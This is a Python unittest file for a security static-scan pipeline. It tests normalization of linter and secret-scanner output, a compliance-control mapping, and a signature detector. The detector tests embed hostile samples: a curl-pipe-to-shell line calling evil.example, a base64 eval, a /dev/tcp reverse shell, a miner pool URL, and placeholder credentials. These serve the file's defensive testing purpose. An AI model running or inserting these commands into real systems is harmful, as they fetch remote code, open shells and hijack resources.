"""ZTIE Story 2.1 — stdlib-unittest tests for the PURE static-scan logic.

Runs offline in the INTEGRATIONS_ONLY sandbox with NO PyPI (boto3/pytest/moto are
not installable) — exactly the 1.2/1.3/1.4 pattern: prove the pure normalization +
summary logic over FIXTURE scanner outputs with stdlib ``unittest``. The
AWS-touching + real-scanner paths (handler / awsio / scanners subprocess) are
live-only and validated by the user in Forensic.

Run:  python3 -m unittest -v   (from lambdas/static_scan/)
"""

from __future__ import annotations

import json
import os
import unittest

import compliance
import normalize
import signatures
import toolplan

_VALID_INTAKE_ID = "62360e03-dfb1-4655-ac52-2a55345ab6f0"
_VALID_SHA = "a" * 64
_NOW = "2026-08-31T16:00:00Z"


# --- Fixture native tool outputs (real shapes, trimmed) ----------------------

CFN_LINT_OUTPUT = json.dumps(
    [
        {
            "Rule": {"Id": "E3012", "Description": "Check types", "Source": "docs://x"},
            "Level": "Error",
            "Location": {
                "Start": {"LineNumber": 10, "ColumnNumber": 3},
                "End": {"LineNumber": 10, "ColumnNumber": 40},
            },
            "Message": "Property Size should be an integer",
            "Filename": "stack.yaml",
        },
        {
            "Rule": {"Id": "W2001", "Description": "Unused parameter"},
            "Level": "Warning",
            "Location": {"Start": {"LineNumber": 2}, "End": {"LineNumber": 2}},
            "Message": "Parameter Foo not used",
            "Filename": "stack.yaml",
        },
    ]
)

BANDIT_OUTPUT = json.dumps(
    {
        "results": [
            {
                "test_id": "B602",
                "test_name": "subprocess_popen_with_shell_equals_true",
                "issue_severity": "HIGH",
                "issue_text": "subprocess call with shell=True identified",
                "filename": "deploy.sh.py",
                "line_number": 12,
                "line_range": [12, 13],
                "more_info": "https://bandit.example/B602",
            }
        ],
        "errors": [],
        "metrics": {},
    }
)

CHECKOV_OUTPUT = json.dumps(
    {
        "results": {
            "failed_checks": [
                {
                    "check_id": "CKV_AWS_20",
                    "check_name": "S3 Bucket has an ACL defined which allows public access",
                    "severity": "HIGH",
                    "file_path": "/stack.yaml",
                    "file_line_range": [5, 12],
                    "resource": "AWS::S3::Bucket.MyBucket",
                    "guideline": "https://checkov.example/CKV_AWS_20",
                },
                {
                    "check_id": "CKV_AWS_18",
                    "check_name": "Ensure the S3 bucket has access logging enabled",
                    # no severity attached -> should default to medium
                    "file_path": "/stack.yaml",
                    "file_line_range": [5, 12],
                    "resource": "AWS::S3::Bucket.MyBucket",
                },
            ],
            "passed_checks": [{"check_id": "CKV_AWS_1"}],
        },
        "summary": {"failed": 2, "passed": 1},
    }
)

# Story 2.2G — gitleaks `--report-format json` emits a top-level ARRAY of finding
# objects (Go struct field names, PascalCase). Real shape, trimmed. The Secret /
# Match carry the raw credential — normalize_gitleaks MUST redact it, never echo it.
GITLEAKS_OUTPUT = json.dumps(
    [
        {
            "RuleID": "aws-access-token",
            "Description": "AWS Access Key",
            "StartLine": 4,
            "EndLine": 4,
            "StartColumn": 6,
            "EndColumn": 25,
            "Match": "AKIAIOSFODNN7EXAMPLE",
            "Secret": "AKIAIOSFODNN7EXAMPLE",
            "File": "deploy.sh",
            "Fingerprint": "deploy.sh:aws-access-token:4",
            "Tags": [],
        },
        {
            "RuleID": "github-pat",
            "Description": "GitHub Personal Access Token",
            "StartLine": 3,
            "EndLine": 3,
            "Match": "token = ghp_abcdefghijklmnopqrstuvwxyz0123456789",
            "Secret": "ghp_abcdefghijklmnopqrstuvwxyz0123456789",
            "File": "deploy.sh",
        },
    ]
)

CFN_GUARD_SARIF_OUTPUT = json.dumps(
    {
        "version": "2.1.0",
        "runs": [
            {
                "tool": {"driver": {"name": "cfn-guard"}},
                "results": [
                    {
                        "ruleId": "S3_BUCKET_ENCRYPTION",
                        "level": "error",
                        "message": {"text": "S3 bucket must define BucketEncryption."},
                        "locations": [
                            {
                                "physicalLocation": {
                                    "artifactLocation": {"uri": "stack.yaml"},
                                    "region": {"startLine": 5, "endLine": 12},
                                }
                            }
                        ],
                    }
                ],
            }
        ],
    }
)


class TestToolPlan(unittest.TestCase):
    def test_iac_template_runs_iac_tools_plus_gitleaks_and_signature(self):
        # Story 2.2G: gitleaks (secret scanner) + the signature engine both run for
        # iac_template alongside the three IaC tools.
        self.assertEqual(
            toolplan.tools_for_class("iac_template"),
            ["cfn-lint", "cfn-guard", "checkov", "gitleaks", "signature-scan"],
        )

    def test_raw_script_runs_bandit_checkov_gitleaks_signature(self):
        # Story 2.2G: gitleaks + the signature engine run for raw_script alongside
        # bandit + checkov.
        self.assertEqual(
            toolplan.tools_for_class("raw_script"),
            ["bandit", "checkov", "gitleaks", "signature-scan"],
        )

    def test_unknown_and_none_run_no_tools(self):
        self.assertEqual(toolplan.tools_for_class("other_unknown"), [])
        self.assertEqual(toolplan.tools_for_class("bogus"), [])
        self.assertEqual(toolplan.tools_for_class(None), [])


class TestNormalizeCfnLint(unittest.TestCase):
    def test_maps_level_to_severity_and_location(self):
        findings = normalize.normalize_tool_output("cfn-lint", CFN_LINT_OUTPUT)
        self.assertEqual(len(findings), 2)
        f0 = findings[0]
        self.assertEqual(f0["tool"], "cfn-lint")
        self.assertEqual(f0["rule_id"], "E3012")
        self.assertEqual(f0["severity"], "high")  # Error -> high
        self.assertEqual(f0["check_family"], "iac_lint")
        self.assertEqual(f0["location"]["file"], "stack.yaml")
        self.assertEqual(f0["location"]["start_line"], 10)
        self.assertEqual(findings[1]["severity"], "medium")  # Warning -> medium


class TestNormalizeBandit(unittest.TestCase):
    def test_maps_issue_severity_and_line_range(self):
        findings = normalize.normalize_tool_output("bandit", BANDIT_OUTPUT)
        self.assertEqual(len(findings), 1)
        f = findings[0]
        self.assertEqual(f["tool"], "bandit")
        self.assertEqual(f["rule_id"], "B602")
        self.assertEqual(f["severity"], "high")
        self.assertEqual(f["check_family"], "sast")
        self.assertEqual(f["location"]["start_line"], 12)
        self.assertEqual(f["location"]["end_line"], 13)


class TestNormalizeCheckov(unittest.TestCase):
    def test_only_failed_checks_become_findings(self):
        findings = normalize.normalize_tool_output("checkov", CHECKOV_OUTPUT)
        self.assertEqual(len(findings), 2)  # failed only; passed ignored
        self.assertEqual(findings[0]["rule_id"], "CKV_AWS_20")
        self.assertEqual(findings[0]["severity"], "high")
        self.assertEqual(findings[0]["check_family"], "iac_misconfig")
        self.assertEqual(findings[0]["location"]["resource"], "AWS::S3::Bucket.MyBucket")

    def test_missing_severity_defaults_medium(self):
        findings = normalize.normalize_tool_output("checkov", CHECKOV_OUTPUT)
        self.assertEqual(findings[1]["severity"], "medium")

    def test_tolerates_list_of_reports(self):
        report = json.loads(CHECKOV_OUTPUT)
        findings = normalize.normalize_tool_output("checkov", json.dumps([report, report]))
        self.assertEqual(len(findings), 4)  # two reports x two failed checks


class TestNormalizeCfnGuardSarif(unittest.TestCase):
    def test_maps_sarif_result(self):
        findings = normalize.normalize_tool_output("cfn-guard", CFN_GUARD_SARIF_OUTPUT)
        self.assertEqual(len(findings), 1)
        f = findings[0]
        self.assertEqual(f["tool"], "cfn-guard")
        self.assertEqual(f["rule_id"], "S3_BUCKET_ENCRYPTION")
        self.assertEqual(f["severity"], "high")  # SARIF error -> high
        self.assertEqual(f["check_family"], "policy_as_code")
        self.assertEqual(f["location"]["start_line"], 5)


class TestNormalizeGitleaks(unittest.TestCase):
    """Story 2.2G — gitleaks is now the SOLE secret scanner (it supersedes the 2.2
    embedded SECRET regex rules). The SECRET assertions live HERE, on the gitleaks
    normalizer, not on the signature engine."""

    def test_maps_gitleaks_findings_to_signature_family(self):
        findings = normalize.normalize_tool_output("gitleaks", GITLEAKS_OUTPUT)
        self.assertEqual(len(findings), 2)
        f = findings[0]
        self.assertEqual(f["tool"], "gitleaks")
        # gitleaks has no severity; every secret is normalized to high evidence.
        self.assertEqual(f["severity"], "high")
        # Decision A: gitleaks findings reuse the existing 'signature' check_family.
        self.assertEqual(f["check_family"], "signature")
        # The gitleaks native rule id is preserved verbatim.
        self.assertEqual(f["rule_id"], "aws-access-token")
        self.assertEqual(f["location"]["file"], "deploy.sh")
        self.assertEqual(f["location"]["start_line"], 4)

    def test_secrets_are_redacted_never_echoed(self):
        findings = normalize.normalize_tool_output("gitleaks", GITLEAKS_OUTPUT)
        blob = json.dumps(findings)
        # The raw secret VALUES must NEVER appear in a normalized finding.
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", blob)
        self.assertNotIn("ghp_abcdefghijklmnopqrstuvwxyz0123456789", blob)
        self.assertIn("redacted", blob)

    def test_gitleaks_findings_map_to_secret_controls(self):
        findings = normalize.normalize_tool_output("gitleaks", GITLEAKS_OUTPUT)
        compliance.enrich_findings(findings)
        for f in findings:
            self.assertIn("compliance", f)
            self.assertNotEqual(f["compliance"]["basis"], "unmapped")
            self.assertIn("IA-5", f["compliance"]["nist_800_53"])
            self.assertIn("A.5.17", f["compliance"]["iso_27001"])

    def test_tolerates_missing_and_odd_keys(self):
        # Missing StartLine / File / Secret must not crash; a bare-minimum finding
        # still normalizes.
        odd = json.dumps([{"RuleID": "generic-api-key"}, {"Description": "x"}, "notadict"])
        findings = normalize.normalize_tool_output("gitleaks", odd)
        self.assertEqual(len(findings), 2)  # the string entry is skipped
        self.assertEqual(findings[0]["tool"], "gitleaks")


class TestNeverRaises(unittest.TestCase):
    """A tool that produced garbage / empty / non-JSON output must not crash."""

    def test_empty_and_none(self):
        for tool in ("cfn-lint", "bandit", "checkov", "cfn-guard", "gitleaks"):
            self.assertEqual(normalize.normalize_tool_output(tool, None), [])
            self.assertEqual(normalize.normalize_tool_output(tool, ""), [])
            self.assertEqual(normalize.normalize_tool_output(tool, "   "), [])

    def test_non_json(self):
        self.assertEqual(
            normalize.normalize_tool_output("checkov", "Traceback: boom"), []
        )

    def test_unexpected_shapes(self):
        # cfn-lint expects an array; a dict yields nothing rather than crashing.
        self.assertEqual(normalize.normalize_tool_output("cfn-lint", "{}"), [])
        # bandit expects results:[]; a list yields nothing.
        self.assertEqual(normalize.normalize_tool_output("bandit", "[]"), [])
        # gitleaks expects an array; a dict yields nothing.
        self.assertEqual(normalize.normalize_tool_output("gitleaks", "{}"), [])
        # unknown tool -> empty
        self.assertEqual(normalize.normalize_tool_output("nope", "[]"), [])

    def test_bytes_input(self):
        findings = normalize.normalize_tool_output("bandit", BANDIT_OUTPUT.encode())
        self.assertEqual(len(findings), 1)


class TestSummaryAndDocument(unittest.TestCase):
    def _all_findings(self):
        findings = []
        for tool, out in (
            ("cfn-lint", CFN_LINT_OUTPUT),
            ("bandit", BANDIT_OUTPUT),
            ("checkov", CHECKOV_OUTPUT),
            ("cfn-guard", CFN_GUARD_SARIF_OUTPUT),
        ):
            findings.extend(normalize.normalize_tool_output(tool, out))
        return findings

    def test_highest_severity_and_counts(self):
        findings = self._all_findings()  # high(cfn-lint) + medium + high(bandit) + high/medium(checkov) + high(guard)
        summary = normalize.build_summary(
            intake_id=_VALID_INTAKE_ID,
            sha256=_VALID_SHA,
            scanned_at=_NOW,
            artifact_class="iac_template",
            tool_runs=[],
            findings=findings,
            findings_s3_bucket="ztie-forensic-artifacts",
            findings_s3_key=f"findings/{_VALID_INTAKE_ID}/static-findings.json",
        )
        scan = summary["scan"]
        self.assertEqual(scan["highest_severity"], "high")
        self.assertEqual(scan["total_findings"], len(findings))
        self.assertEqual(sum(scan["counts_by_severity"].values()), len(findings))
        # fixed keys present
        self.assertEqual(
            set(scan["counts_by_severity"].keys()),
            {"info", "low", "medium", "high", "critical"},
        )

    def test_summary_has_no_verdict_fields(self):
        summary = normalize.build_summary(
            intake_id=_VALID_INTAKE_ID,
            sha256=_VALID_SHA,
            scanned_at=_NOW,
            artifact_class="raw_script",
            tool_runs=[],
            findings=[],
            findings_s3_bucket="b",
            findings_s3_key="k",
        )
        blob = json.dumps(summary)
        for forbidden in ("verdict", "approved", "forward", "pass_fail", '"safe"'):
            self.assertNotIn(forbidden, blob)
        self.assertEqual(summary["scan"]["highest_severity"], "none")  # zero findings
        self.assertTrue(summary["scan"]["non_executing"])

    def test_document_non_executing_and_truncation(self):
        many = [
            normalize._finding(
                tool="bandit",
                rule_id="B101",
                severity="low",
                check_family="sast",
                message="x",
            )
            for _ in range(5001)
        ]
        doc = normalize.build_findings_document(
            intake_id=_VALID_INTAKE_ID,
            sha256=_VALID_SHA,
            artifact_class="raw_script",
            scanned_at=_NOW,
            tool_runs=[normalize.build_tool_run("bandit", status="ok", finding_count=5001)],
            findings=many,
        )
        self.assertTrue(doc["non_executing"])
        self.assertEqual(len(doc["findings"]), 5000)  # capped
        self.assertTrue(doc["truncated"])
        # the per-tool count remains the TRUE pre-truncation count
        self.assertEqual(doc["tools"][0]["finding_count"], 5001)


# =============================================================================
# Story 2.2 — compliance-framework mapping (compliance.py)
# =============================================================================


class TestComplianceMapping(unittest.TestCase):
    def test_cfn_guard_rule_maps_to_controls_proposed(self):
        c = compliance.map_finding("cfn-guard", "S3_BUCKET_ENCRYPTION")
        self.assertIn("SC-28", c["nist_800_53"])
        self.assertIn("A.8.24", c["iso_27001"])
        # candidate-vs-ratified: table is unratified -> proposed, never asserted.
        self.assertEqual(c["basis"], "proposed")
        self.assertEqual(c["mapping_version"], compliance.MAPPING_VERSION)

    def test_bandit_exact_and_prefix(self):
        exact = compliance.map_finding("bandit", "B602")
        self.assertIn("SI-10", exact["nist_800_53"])
        # An unlisted Bnnn falls to the generic bandit family (prefix 'B').
        generic = compliance.map_finding("bandit", "B999")
        self.assertIn("SA-11", generic["nist_800_53"])
        self.assertEqual(generic["basis"], "proposed")

    def test_checkov_topic_by_message_keyword(self):
        pub = compliance.map_finding("checkov", "CKV_AWS_20", "S3 Bucket allows public access")
        self.assertIn("AC-3", pub["nist_800_53"])
        enc = compliance.map_finding("checkov", "CKV_AWS_19", "Ensure encryption is enabled")
        self.assertIn("SC-28", enc["nist_800_53"])
        sec = compliance.map_finding("checkov", "CKV_SECRET_6", "Hardcoded AWS credential found")
        self.assertIn("IA-5", sec["nist_800_53"])

    def test_signature_family_maps(self):
        secret = compliance.map_finding("signature-scan", "ZTIE-SIG-SECRET-001")
        self.assertIn("IA-5", secret["nist_800_53"])
        malware = compliance.map_finding("signature-scan", "ZTIE-SIG-MALWARE-002")
        self.assertIn("SI-3", malware["nist_800_53"])
        dangerous = compliance.map_finding("signature-scan", "ZTIE-SIG-DANGEROUS-001")
        self.assertIn("SI-10", dangerous["nist_800_53"])

    def test_unmapped_never_fabricates_a_control(self):
        c = compliance.map_finding("bandit", "ZZZ_no_such_rule_family")
        self.assertEqual(c["nist_800_53"], [])
        self.assertEqual(c["iso_27001"], [])
        self.assertEqual(c["basis"], "unmapped")

    def test_mapping_is_never_a_verdict(self):
        c = compliance.map_finding("cfn-guard", "IAM_NO_WILDCARD_ADMIN")
        blob = json.dumps(c)
        for forbidden in ("verdict", "approved", "forward", "pass_fail", '"safe"', "fail"):
            self.assertNotIn(forbidden, blob.lower())

    def test_controls_are_bounded(self):
        c = compliance.map_finding("cfn-guard", "SG_NO_UNRESTRICTED_INGRESS")
        self.assertLessEqual(len(c["nist_800_53"]), 8)
        for cid in c["nist_800_53"]:
            self.assertLessEqual(len(cid), 32)

    def test_enrich_findings_attaches_compliance(self):
        findings = normalize.normalize_tool_output("cfn-guard", CFN_GUARD_SARIF_OUTPUT)
        compliance.enrich_findings(findings)
        self.assertIn("compliance", findings[0])
        self.assertIn("nist_800_53", findings[0]["compliance"])

    def test_rollup_counts_and_unmapped(self):
        findings = [
            {"tool": "cfn-guard", "rule_id": "S3_BUCKET_ENCRYPTION", "message": ""},
            {"tool": "cfn-guard", "rule_id": "EBS_VOLUME_ENCRYPTED", "message": ""},
            {"tool": "bandit", "rule_id": "ZZZ_unmapped", "message": ""},
        ]
        compliance.enrich_findings(findings)
        rollup = compliance.build_compliance_rollup(findings)
        self.assertEqual(rollup["mapped_findings"], 2)
        self.assertEqual(rollup["unmapped_findings"], 1)
        # SC-28 implicated by both encryption findings.
        self.assertEqual(rollup["nist_800_53"]["SC-28"], 2)
        self.assertEqual(rollup["mapping_version"], compliance.MAPPING_VERSION)


# =============================================================================
# Story 2.2 — signature engine (signatures.py)
# =============================================================================

# Story 2.2G — the signature engine no longer detects SECRETS (gitleaks owns that
# now). This sample exercises the RETAINED DANGEROUS + MALWARE families only.
_DANGEROUS_SAMPLE = (
    "#!/bin/bash\n"
    "curl http://evil.example/x | sh\n"
    "eval(base64.b64decode(payload))\n"
    "chmod 777 /tmp/x\n"
)


class TestSignatureEngine(unittest.TestCase):
    def test_detects_dangerous_patterns(self):
        # Story 2.2G: SECRET rules were removed (superseded by gitleaks); the engine
        # now detects the DANGEROUS + MALWARE families only.
        res = signatures.scan_bytes(_DANGEROUS_SAMPLE.encode(), "deploy.sh")
        self.assertEqual(res.status, "ok")
        rule_ids = {f["rule_id"] for f in res.findings}
        self.assertIn("ZTIE-SIG-DANGEROUS-001", rule_ids)  # curl | sh
        self.assertIn("ZTIE-SIG-DANGEROUS-002", rule_ids)  # eval(...)
        self.assertIn("ZTIE-SIG-DANGEROUS-005", rule_ids)  # chmod 777

    def test_no_secret_rules_remain(self):
        # Explicitly prove the SECRET family is gone — a planted AWS key that the 2.2
        # engine would have flagged (ZTIE-SIG-SECRET-*) now yields NO signature
        # finding (gitleaks is the sole secret source of truth).
        res = signatures.scan_bytes(
            b'AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"\n', "x.sh"
        )
        self.assertEqual(res.status, "ok")
        self.assertTrue(all(not f["rule_id"].startswith("ZTIE-SIG-SECRET") for f in res.findings))

    def test_findings_are_normalized_shape(self):
        res = signatures.scan_bytes(_DANGEROUS_SAMPLE.encode(), "deploy.sh")
        f = res.findings[0]
        self.assertEqual(f["tool"], "signature-scan")
        self.assertEqual(f["check_family"], "signature")
        self.assertIn(f["severity"], normalize.SEVERITY_ORDER)
        self.assertIn("start_line", f["location"])

    def test_eicar_detected(self):
        eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        res = signatures.scan_bytes(eicar, "x.txt")
        self.assertIn("ZTIE-SIG-MALWARE-002", {f["rule_id"] for f in res.findings})

    def test_reverse_shell_and_miner_detected(self):
        rev = b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nstratum+tcp://pool.example:3333\n"
        rule_ids = {f["rule_id"] for f in signatures.scan_bytes(rev, "x.sh").findings}
        self.assertIn("ZTIE-SIG-MALWARE-001", rule_ids)  # reverse shell
        self.assertIn("ZTIE-SIG-MALWARE-003", rule_ids)  # crypto-miner

    def test_clean_input_no_findings(self):
        res = signatures.scan_bytes(b"print('hello world')\n", "ok.py")
        self.assertEqual(res.status, "ok")
        self.assertEqual(res.findings, [])

    def test_never_raises_on_binary_or_empty(self):
        for data in (b"", b"\x00\x01\x02\xff", "   "):
            res = signatures.scan_bytes(data, "b")
            self.assertEqual(res.status, "ok")

    def test_signature_findings_map_to_controls(self):
        res = signatures.scan_bytes(_DANGEROUS_SAMPLE.encode(), "deploy.sh")
        compliance.enrich_findings(res.findings)
        for f in res.findings:
            self.assertIn("compliance", f)
            # A dangerous/malware signature finding is always mappable.
            self.assertNotEqual(f["compliance"]["basis"], "unmapped")


class TestSummaryWithCompliance(unittest.TestCase):
    def test_summary_carries_bounded_compliance_rollup_no_verdict(self):
        findings = normalize.normalize_tool_output("cfn-guard", CFN_GUARD_SARIF_OUTPUT)
        compliance.enrich_findings(findings)
        summary = normalize.build_summary(
            intake_id=_VALID_INTAKE_ID,
            sha256=_VALID_SHA,
            scanned_at=_NOW,
            artifact_class="iac_template",
            tool_runs=[],
            findings=findings,
            findings_s3_bucket="b",
            findings_s3_key="k",
        )
        self.assertEqual(summary["contract_version"], "1.2")
        rollup = summary["scan"]["compliance"]
        self.assertIn("nist_800_53", rollup)
        self.assertIn("mapped_findings", rollup)
        blob = json.dumps(summary)
        for forbidden in ("verdict", "approved", "forward", "pass_fail", '"safe"'):
            self.assertNotIn(forbidden, blob)
        # No mapping RATIONALE crosses in the summary (that stays in Forensic).
        self.assertNotIn("rationale", json.dumps(rollup))


# A minimal, dependency-free JSON-Schema (draft-07 subset) conformance walk so the
# built documents can be proven against the contracts OFFLINE (jsonschema is not
# installable in the INTEGRATIONS_ONLY sandbox). It covers exactly the constructs
# the ZTIE contracts use: type, enum, const, required, additionalProperties (bool
# or subschema), properties, items, minItems/maxItems, maxProperties, min/max,
# maxLength, pattern. It is intentionally strict on additionalProperties=false.


def _conforms(instance, schema, path="<root>"):
    """Return a list of violation strings (empty == conforms). Never raises."""
    import re as _re

    errs = []
    t = schema.get("type")

    def _is_type(v, ty):
        if ty == "object":
            return isinstance(v, dict)
        if ty == "array":
            return isinstance(v, list)
        if ty == "string":
            return isinstance(v, str)
        if ty == "integer":
            return isinstance(v, int) and not isinstance(v, bool)
        if ty == "number":
            return isinstance(v, (int, float)) and not isinstance(v, bool)
        if ty == "boolean":
            return isinstance(v, bool)
        return True

    if t is not None:
        types = t if isinstance(t, list) else [t]
        if not any(_is_type(instance, ty) for ty in types):
            errs.append(f"{path}: expected type {t}, got {type(instance).__name__}")
            return errs
    if "const" in schema and instance != schema["const"]:
        errs.append(f"{path}: expected const {schema['const']!r}")
    if "enum" in schema and instance not in schema["enum"]:
        errs.append(f"{path}: {instance!r} not in enum")
    if isinstance(instance, str):
        if "maxLength" in schema and len(instance) > schema["maxLength"]:
            errs.append(f"{path}: exceeds maxLength {schema['maxLength']}")
        if "pattern" in schema and not _re.search(schema["pattern"], instance):
            errs.append(f"{path}: does not match pattern")
    if isinstance(instance, (int, float)) and not isinstance(instance, bool):
        if "minimum" in schema and instance < schema["minimum"]:
            errs.append(f"{path}: below minimum")
        if "maximum" in schema and instance > schema["maximum"]:
            errs.append(f"{path}: above maximum")
    if isinstance(instance, dict):
        for req in schema.get("required", []):
            if req not in instance:
                errs.append(f"{path}: missing required '{req}'")
        props = schema.get("properties", {})
        addl = schema.get("additionalProperties", True)
        if "maxProperties" in schema and len(instance) > schema["maxProperties"]:
            errs.append(f"{path}: exceeds maxProperties")
        for k, v in instance.items():
            if k in props:
                errs += _conforms(v, props[k], f"{path}.{k}")
            elif addl is False:
                errs.append(f"{path}: additional property '{k}' not allowed")
            elif isinstance(addl, dict):
                errs += _conforms(v, addl, f"{path}.{k}")
    if isinstance(instance, list):
        if "maxItems" in schema and len(instance) > schema["maxItems"]:
            errs.append(f"{path}: exceeds maxItems")
        if "minItems" in schema and len(instance) < schema["minItems"]:
            errs.append(f"{path}: below minItems")
        items = schema.get("items")
        if isinstance(items, dict):
            for i, v in enumerate(instance):
                errs += _conforms(v, items, f"{path}[{i}]")
    return errs


class TestManualConformance(unittest.TestCase):
    """Pure-Python conformance proof (no jsonschema) that the built v1.1 findings
    document + summary satisfy their contracts, incl. the Story 2.2 additions."""

    def _schema(self, rel_from_repo):
        repo = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        with open(os.path.join(repo, rel_from_repo), encoding="utf-8") as fh:
            return json.load(fh)

    def _built(self):
        findings = normalize.normalize_tool_output("cfn-guard", CFN_GUARD_SARIF_OUTPUT)
        # Story 2.2G: gitleaks (secrets) + the signature engine (dangerous/malware).
        findings += normalize.normalize_tool_output("gitleaks", GITLEAKS_OUTPUT)
        findings += signatures.scan_bytes(_DANGEROUS_SAMPLE.encode(), "deploy.sh").findings
        compliance.enrich_findings(findings)
        tool_runs = [
            normalize.build_tool_run("cfn-guard", status="ok", finding_count=1),
            normalize.build_tool_run("gitleaks", status="ok", finding_count=2),
            normalize.build_tool_run("signature-scan", status="ok", finding_count=3),
        ]
        doc = normalize.build_findings_document(
            intake_id=_VALID_INTAKE_ID,
            sha256=_VALID_SHA,
            artifact_class="iac_template",
            scanned_at=_NOW,
            tool_runs=tool_runs,
            findings=findings,
        )
        summary = normalize.build_summary(
            intake_id=_VALID_INTAKE_ID,
            sha256=_VALID_SHA,
            scanned_at=_NOW,
            artifact_class="iac_template",
            tool_runs=tool_runs,
            findings=findings,
            findings_s3_bucket="ztie-forensic-artifacts",
            findings_s3_key=f"findings/{_VALID_INTAKE_ID}/static-findings.json",
        )
        return doc, summary

    def test_findings_document_conforms(self):
        doc, _ = self._built()
        schema = self._schema("schemas/static-findings.contract.v1.json")
        errs = _conforms(doc, schema)
        self.assertEqual(errs, [], msg=errs)

    def test_summary_conforms(self):
        _, summary = self._built()
        schema = self._schema("schemas/static-scan-summary.contract.v1.json")
        errs = _conforms(summary, schema)
        self.assertEqual(errs, [], msg=errs)


@unittest.skipUnless(
    os.environ.get("ZTIE_RUN_SCHEMA_CONFORMANCE") == "1",
    "schema conformance needs jsonschema (live/CI only); set ZTIE_RUN_SCHEMA_CONFORMANCE=1",
)
class TestSchemaConformance(unittest.TestCase):
    """Validate the built summary + document against their bundled contracts.

    Skipped offline (jsonschema is not installable in the INTEGRATIONS_ONLY
    sandbox). Runs live/CI where jsonschema is present.
    """

    def _validator(self, filename):
        from jsonschema import Draft7Validator

        here = os.path.dirname(__file__)
        with open(os.path.join(here, filename), encoding="utf-8") as fh:
            return Draft7Validator(json.load(fh))

    def test_document_conforms(self):
        findings = normalize.normalize_tool_output("cfn-lint", CFN_LINT_OUTPUT)
        findings += normalize.normalize_tool_output("gitleaks", GITLEAKS_OUTPUT)
        findings += signatures.scan_bytes(_DANGEROUS_SAMPLE.encode(), "deploy.sh").findings
        compliance.enrich_findings(findings)  # per-finding compliance
        doc = normalize.build_findings_document(
            intake_id=_VALID_INTAKE_ID,
            sha256=_VALID_SHA,
            artifact_class="iac_template",
            scanned_at=_NOW,
            tool_runs=[
                normalize.build_tool_run("cfn-lint", status="ok", finding_count=1),
                normalize.build_tool_run("gitleaks", status="ok", finding_count=2),
                normalize.build_tool_run("signature-scan", status="ok", finding_count=3),
            ],
            findings=findings,
        )
        errors = list(self._validator("static-findings.contract.v1.json").iter_errors(doc))
        self.assertEqual(errors, [], msg=[e.message for e in errors])

    def test_summary_conforms(self):
        # The summary contract is bundled into the Hub validator, not the static
        # asset — validate against the canonical repo copy.
        from jsonschema import Draft7Validator

        repo = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        with open(
            os.path.join(repo, "schemas", "static-scan-summary.contract.v1.json"),
            encoding="utf-8",
        ) as fh:
            validator = Draft7Validator(json.load(fh))
        findings = normalize.normalize_tool_output("cfn-guard", CFN_GUARD_SARIF_OUTPUT)
        findings += normalize.normalize_tool_output("gitleaks", GITLEAKS_OUTPUT)
        findings += signatures.scan_bytes(_DANGEROUS_SAMPLE.encode(), "deploy.sh").findings
        compliance.enrich_findings(findings)
        summary = normalize.build_summary(
            intake_id=_VALID_INTAKE_ID,
            sha256=_VALID_SHA,
            scanned_at=_NOW,
            artifact_class="iac_template",
            tool_runs=[
                normalize.build_tool_run("cfn-guard", status="ok", finding_count=1),
                normalize.build_tool_run("gitleaks", status="ok", finding_count=2),
                normalize.build_tool_run("signature-scan", status="ok", finding_count=3),
            ],
            findings=findings,
            findings_s3_bucket="ztie-forensic-artifacts",
            findings_s3_key=f"findings/{_VALID_INTAKE_ID}/static-findings.json",
        )
        errors = list(validator.iter_errors(summary))
        self.assertEqual(errors, [], msg=[e.message for e in errors])


if __name__ == "__main__":
    unittest.main()
